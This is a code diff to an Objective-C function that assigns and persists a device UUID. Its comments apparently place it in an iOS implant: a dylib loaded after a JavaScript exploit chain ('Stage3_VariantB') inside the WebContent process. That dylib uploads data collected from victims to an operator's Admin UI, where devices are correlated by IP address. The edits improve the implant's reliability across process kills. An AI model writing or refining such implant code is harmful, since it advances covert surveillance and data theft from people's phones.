@@ -17,21 +17,23 @@
  * Persistent device UUID.
  *
  * Priority order:
- *   1. __ds_dsid  — UUID written by the JS chain into sessionStorage (then
- *                   bridged into NSUserDefaults by Stage3_VariantB before
- *                   dlopen so the dylib shares the same UUID as the chain).
- *   2. __cru_id   — previously persisted dylib UUID (survives app restarts).
- *   3. Fresh UUID — first run, stored under __cru_id for next time.
+ *   1. __ds_dsid  — UUID written by Stage3_VariantB into NSUserDefaults before
+ *                   calling _process(), provided the Stage3 build includes that
+ *                   bridging step.  When present, the dylib and JS chain share
+ *                   the same device UUID in the Admin UI.
+ *   2. __cru_id   — UUID persisted by a previous dylib run (survives restarts).
+ *   3. Fresh UUID — first-run fallback; stored under __cru_id for next time.
  *
- * This ensures that data uploaded by the dylib appears under the same device
- * entry in the Admin UI as the JS-chain chain_result records.
+ * Note: if Stage3 does not write __ds_dsid, the dylib will generate its own
+ * UUID and appear as a separate device entry in the Admin UI.  The data is
+ * still collected; the operator simply needs to correlate by IP address.
  * -------------------------------------------------------------------------- */
 static NSString *coruna_device_uuid(void) {
     static NSString *cached = nil;
     static dispatch_once_t once;
     dispatch_once(&once, ^{
         NSUserDefaults *d = [NSUserDefaults standardUserDefaults];
-        // Prefer the UUID set by the JS chain (Stage3 writes __ds_dsid before dlopen)
+        // Prefer the UUID set by the JS chain (if Stage3 writes __ds_dsid to NSUserDefaults)
         NSString *u = [d stringForKey:@"__ds_dsid"];
         if (!u || u.length < 8) {
             // Fall back to previously persisted dylib UUID
@@ -41,9 +43,15 @@ static NSString *coruna_device_uuid(void) {
             // First run — generate and persist a fresh UUID
             u = [[NSUUID UUID] UUIDString];
         }
-        // Always persist under __cru_id so we survive sessionStorage being cleared
+        // Persist under __cru_id so we survive sessionStorage being cleared.
+        // synchronize is deprecated in iOS 12+ but we call it explicitly here
+        // because WebContent is often kill-9'd by jetsam; without synchronize
+        // the in-memory plist may not reach disk before the process dies.
         [d setObject:u forKey:@"__cru_id"];
+#pragma clang diagnostic push
+#pragma clang diagnostic ignored "-Wdeprecated-declarations"
         [d synchronize];
+#pragma clang diagnostic pop
         cached = u;
     });
     return cached;
